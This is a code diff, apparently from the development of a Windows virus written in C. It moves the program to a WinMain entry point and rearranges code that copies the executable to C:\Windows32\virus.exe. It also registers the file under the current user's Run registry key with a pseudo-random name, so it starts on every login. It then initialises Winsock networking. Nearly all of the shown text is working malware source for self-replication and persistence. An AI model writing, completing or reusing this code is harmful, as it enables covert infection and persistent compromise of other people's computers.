@@ -35,12 +35,12 @@ void window(HWND win,LPARAM lparam){
 	return;
 }
 
-void main(){
-	HANDLE name = GetCurrentProcess();
-	QueryFullProcessImageNameA(name,0,path,&size);
-	RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
-	regname[0] = GetTickCount() | 0x80;
-	RegSetValueExA(hkey,regname,0,REG_SZ,path,100);
+_stdcall WinMain(
+	HINSTANCE hInstance,
+	HINSTANCE previnstance,
+	LPTSTR cmdline,
+	int cmdshow)
+{
 	CreateDirectoryA("C:\\Windows32",0);
 	HANDLE file1 = CreateFileA("C:\\Windows32\\virus.exe",GENERIC_WRITE,0,0,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
 	if(!GetLastError()){
@@ -57,6 +57,12 @@ void main(){
 	}
 	else{
 		CloseHandle(file1);
+		HANDLE name = GetCurrentProcess();
+		QueryFullProcessImageNameA(name,0,path,&size);
+		RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+		regname[0] = GetTickCount() | 0x80;
+		regname[1] = (GetTickCount() << 8) | 0x80;
+		RegSetValueExA(hkey,regname,0,REG_SZ,path,100);
 	}
 	WORD ver = MAKEWORD(2,2);
 	WSAStartup(ver, &data);
@@ -101,11 +107,3 @@ try_again:
 		Sleep(1000);
 	}
 }
-
-
-
-
-
-
-
-
